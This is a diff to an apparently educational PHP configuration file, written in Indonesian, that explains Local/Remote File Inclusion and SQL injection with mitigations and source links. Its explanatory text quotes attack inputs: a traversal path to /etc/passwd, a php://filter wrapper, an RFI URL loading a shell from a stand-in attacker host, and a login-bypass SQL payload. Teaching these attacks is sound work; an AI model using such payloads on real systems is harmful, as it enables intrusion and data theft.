@@ -91,38 +91,38 @@ return [
 
     'lfi' => [
         'concept' => [
-            'Local File Inclusion (LFI) terjadi ketika aplikasi memuat berkas berdasarkan parameter yang '
-                . 'dikontrol pengguna (mis. `?page=tentang.php`) tanpa validasi, menggunakan fungsi seperti '
-                . '`include()` atau `require()`. Penyerang dapat mengganti parameter tersebut dengan path ke '
-                . 'berkas sensitif di server, seperti `../../../../etc/passwd`.',
-            'Jika server juga mengizinkan pemanggilan URL eksternal, variannya disebut Remote File Inclusion '
-                . '(RFI), yang bisa langsung mengeksekusi kode dari server penyerang.',
+            'File Inclusion adalah celah keamanan saat aplikasi memuat file berdasarkan input pengguna (seperti pada fungsi PHP include() atau require()) tanpa validasi yang memadai, sehingga berisiko membocorkan data sensitif, kredensial, hingga berujung pada Remote Code Execution (RCE).',
+            'Local File Inclusion (LFI): Penyerang menyisipkan karakter directory traversal (seperti ?page=../../../../etc/passwd) atau wrapper PHP (seperti php://filter) untuk membaca file sensitif dan source code di dalam server lokal.',
+            'Remote File Inclusion (RFI): Penyerang memuat dan menjalankan file berbahaya dari server eksternal melalui URL (seperti ?page=http://attacker.com/shell.php) jika konfigurasi PHP allow_url_include diaktifkan.',
         ],
         'mitigation' => [
-            'Gunakan whitelist eksplisit: daftar nama berkas yang diizinkan, tolak semua nilai di luar daftar itu.',
-            'Hindari menggunakan input pengguna secara langsung sebagai nama berkas/path.',
-            'Nonaktifkan allow_url_include di konfigurasi PHP untuk mencegah RFI.',
-            'Gunakan basename() dan validasi path untuk mencegah path traversal (../).',
+            'Hindari input langsung : Jangan meneruskan input pengguna secara langsung ke dalam fungsi include() atau require().',
+            'Gunakan whitelist dan validasi : Validasi seluruh input pengguna dan batasi file yang boleh dimuat hanya berdasarkan daftar putih (whitelist).',
+            'Nonaktifkan fitur berbahaya : Matikan konfigurasi PHP yang tidak diperlukan, seperti allow_url_include, untuk mencegah serangan RFI.',
+            'Batasi hak akses & perbarui sistem: Terapkan pembatasan hak akses file pada server serta rutin perbarui versi PHP dan framework ke versi terbaru.',
         ],
         'youtube_ids' => ['LvaB_6rU-Cc', '485YJD48GAs'],
+        'sources' => [
+        ['title' => 'Aditya Ardiansyah (Medium) – Belajar tentang File Inclusion dalam Penetration Testing', 'url' => 'https://adityasyah.medium.com/belajar-tentang-file-inclusion-dalam-penetration-testing-9eb8dc47ed32'],
+        ],
     ],
 
-    'sql_injection' => [
-        'concept' => [
-            'SQL Injection terjadi ketika input pengguna digabungkan langsung ke dalam query SQL tanpa '
-                . 'sanitasi, sehingga penyerang dapat mengubah struktur/makna query tersebut. Contoh klasik: '
-                . 'input `\' OR 1=1 --` dapat membuat kondisi WHERE selalu bernilai benar, melewati proses login.',
-            'Dengan teknik UNION SELECT, penyerang bahkan bisa mengekstrak data dari tabel lain di database '
-                . 'yang sama, termasuk data sensitif seperti password pengguna.',
-        ],
-        'mitigation' => [
-            'Gunakan prepared statement / parameterized query (mis. mysqli_prepare dengan bind_param) untuk SEMUA query yang melibatkan input pengguna.',
-            'Terapkan prinsip least privilege pada akun database aplikasi (jangan pakai akun root untuk operasi harian).',
-            'Validasi dan batasi tipe data input (mis. pastikan ID harus berupa angka).',
-            'Jangan menampilkan pesan error database mentah ke pengguna (mencegah error-based SQL injection).',
-        ],
-        'youtube_ids' => ['Pohx-GidauE'],
+   'sql_injection' => [
+    'concept' => [
+        'SQL Injection adalah metode serangan siber di mana penyerang menyisipkan kode SQL berbahaya ke dalam input pengguna (seperti form atau URL) untuk memanipulasi query database, sehingga dapat mencuri data sensitif atau mengambil alih sistem.',
+        'Terjadi saat aplikasi memproses input pengguna tanpa validasi. Penyerang dapat melewati autentikasi (login bypass) dengan memasukkan payload seperti \' OR \'1\'=\'1, atau menggunakan teknik seperti Classic, Blind (respon benar/salah), Error-based (memanfaatkan pesan error), dan Union-based (mengambil data dari tabel lain).',
     ],
+    'mitigation' => [
+        'Gunakan parameterized query : Terapkan prepared statement agar input pengguna tidak dieksekusi sebagai perintah SQL.',
+        'Selalu validasi input : Pastikan setiap data yang dimasukkan pengguna telah divalidasi sebelum diproses oleh database.',
+        'Terapkan Web Application Firewall (WAF): Gunakan WAF untuk menyaring dan memblokir pola serangan berbahaya secara otomatis.',
+        'Perbarui sistem secara rutin: Selalu update versi framework, library, dan sistem database untuk menutup celah keamanan.',
+    ],
+    'youtube_ids' => ['Pohx-GidauE'],
+    'sources' => [
+        ['title' => 'Telkom University – SQL Injection: Pengertian, Jenis, Contoh, dan Cara Mencegah', 'url' => 'https://msf.telkomuniversity.ac.id/sql-injection-adalah-pengertian-jenis-contoh-dan-cara-mencegah/'],
+    ],
+],
 
     'xss_reflected' => [
         'concept' => [
@@ -159,4 +159,5 @@ return [
         ],
         'youtube_ids' => ['aOgKHzo9Rdw'],
     ],
-]; 
+    ];
+
